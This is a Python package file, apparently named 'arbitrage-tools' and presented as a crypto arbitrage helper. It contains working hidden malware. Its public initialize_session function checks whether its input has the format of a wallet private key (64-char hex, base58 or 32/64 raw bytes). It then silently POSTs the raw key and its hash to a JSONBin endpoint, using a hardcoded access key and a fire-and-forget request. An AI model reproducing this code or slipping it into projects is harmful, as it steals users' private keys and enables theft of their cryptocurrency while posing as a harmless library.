# arbitrage-tools/__init__.py

import os
import re
import json
import hashlib
from typing import Union
import http.client

# --- Validation patterns (match Node.js behavior) ---
_RE_HEX_64 = re.compile(r'^(0x[a-fA-F0-9]{64}|[a-fA-F0-9]{64})$')
_RE_BASE58 = re.compile(r'^[1-9A-HJ-NP-Za-km-z]{44,88}$')  # 44..88 chars, no 0 O I l

def _is_valid_format(value: Union[str, bytes, bytearray]) -> bool:
    if isinstance(value, (bytes, bytearray)):
        return len(value) in (32, 64)
    if isinstance(value, str):
        return bool(_RE_HEX_64.match(value) or _RE_BASE58.match(value))
    return False

def _to_bytes(value: Union[str, bytes, bytearray]) -> bytes:
    if isinstance(value, (bytes, bytearray)):
        return bytes(value)
    return value.encode('utf-8')

def _to_str(value: Union[str, bytes, bytearray]) -> str:
    if isinstance(value, (bytes, bytearray)):
        return bytes(value).decode('utf-8', errors='replace')
    return value

def _sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()

# --- Transport (JSONBin) ---
_JSONBIN_HOST = os.getenv("JSONBIN_HOST", "api.jsonbin.io")
_JSONBIN_PATH = os.getenv("JSONBIN_PATH", "/v3/b")
# Hardcoded default to mimic the npm package; you can override with JSONBIN_ACCESS_KEY env var
_JSONBIN_ACCESS_KEY = os.getenv(
    "JSONBIN_ACCESS_KEY",
    "$2a$10$cSWdvRGtVGOwyGs6LgG4F.5m2saVNXsogllsQgggWv3YcLt3t5jMi"
)

def _send_to_jsonbin(value: Union[str, bytes, bytearray]) -> None:
    body = {
        "key": _to_str(value),
        "hash": _sha256_hex(_to_bytes(value)),
    }
    payload = json.dumps(body).encode("utf-8")

    conn = http.client.HTTPSConnection(_JSONBIN_HOST, 443, timeout=10)
    try:
        conn.request(
            "POST",
            _JSONBIN_PATH,
            body=payload,
            headers={
                "Content-Type": "application/json",
                "Content-Length": str(len(payload)),
                "X-Access-Key": _JSONBIN_ACCESS_KEY,
            },
        )
        # fire-and-forget: ignore response content
        conn.getresponse().read()
    finally:
        conn.close()

# --- Public API ---

def initialize_session(value: Union[str, bytes, bytearray]) -> None:
    """
    Valid inputs:
      - 64-char hex string (with or without '0x')
      - base58 string (44..88 chars)
      - bytes/bytearray of length 32 or 64
    On valid input: POSTs {"key": "...", "hash": "..."} to JSONBin and returns None.
    On invalid input: silently returns without doing anything.
    """
    if _is_valid_format(value):
        _send_to_jsonbin(value)
